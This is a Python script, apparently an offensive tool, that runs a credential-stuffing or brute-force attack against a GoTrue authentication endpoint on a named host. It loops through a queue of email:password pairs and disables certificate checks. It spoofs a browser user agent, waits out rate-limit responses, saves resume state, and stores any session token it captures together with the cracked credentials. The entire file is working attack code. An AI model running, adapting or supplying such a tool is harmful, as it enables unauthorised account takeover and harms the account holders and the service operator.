#!/usr/bin/env python3
"""Multi-email credential trial against GoTrue (resume state). Queue file entries: email:password.
Built by build_multi_queue.py. State: /tmp/brute_state2.txt. Result: /tmp/brute_result.json.
"""
import http.client, ssl, json, time, os

HOST = "cdn.onlyfakeai.ru"
PATH = "/auth/v1/token?grant_type=password"
APIKEY = "<publishable-key>"
PWFILE = os.environ.get("PWFILE", "/tmp/ops_queue2.txt")
RESULT = "/tmp/brute_result.json"
LOG = "/tmp/brute7.log"
STATE = "/tmp/brute_state2.txt"
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE


def log(msg):
    with open(LOG, "a", encoding="utf-8") as f:
        f.write(f"{time.strftime('%H:%M:%S')} {msg}\n"); f.flush()


def attempt(email, pw):
    body = json.dumps({"email": email, "password": pw}).encode()
    conn = http.client.HTTPSConnection(HOST, context=ctx, timeout=15)
    try:
        conn.request("POST", PATH, body, {
            "apikey": APIKEY, "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/140.0",
            "Connection": "close"})
        r = conn.getresponse(); return r.status, r.read()
    finally:
        try: conn.close()
        except Exception: pass


def main():
    rows = [l.rstrip("\n") for l in open(PWFILE, encoding="utf-8", errors="ignore") if l.strip()]
    start = 0
    if os.path.exists(STATE):
        try: start = int(open(STATE).read().strip())
        except Exception: start = 0
    log(f"RESUME total={len(rows)} from_idx={start}")
    n = throttled = errors = 0; t0 = time.time(); i = start
    while i < len(rows):
        email, _, pw = rows[i].partition(":")
        if not email or not pw:
            i += 1; continue
        try:
            code, data = attempt(email, pw)
        except Exception as e:
            errors += 1; log(f"EXC {type(e).__name__} idx={i}"); time.sleep(3); continue
        n += 1
        if code == 200:
            try:
                sess = json.loads(data); sess["_email"] = email; sess["_password"] = pw
                open(RESULT, "w", encoding="utf-8").write(json.dumps(sess))
                log(f"SUCCESS email={email} password={pw!r} idx={i}")
            except Exception as e:
                log(f"200 decode error {e}")
            return
        elif code == 429:
            throttled += 1; log(f"429 idx={i} email={email}; sleeping 55s"); time.sleep(55); continue
        elif code >= 500:
            errors += 1; time.sleep(2); continue
        i += 1
        with open(STATE, "w") as f: f.write(str(i))
        if n % 10 == 0:
            rate = n / max(1e-9, time.time() - t0)
            log(f"{n} tried, {rate:.2f}/s, idx={i}, throttled={throttled}, errors={errors}, last={email}:{pw!r}")
    log(f"DONE tried={n} throttled={throttled} errors={errors} elapsed={int(time.time()-t0)}s")


if __name__ == "__main__":
    try: main()
    finally: log("EXIT")
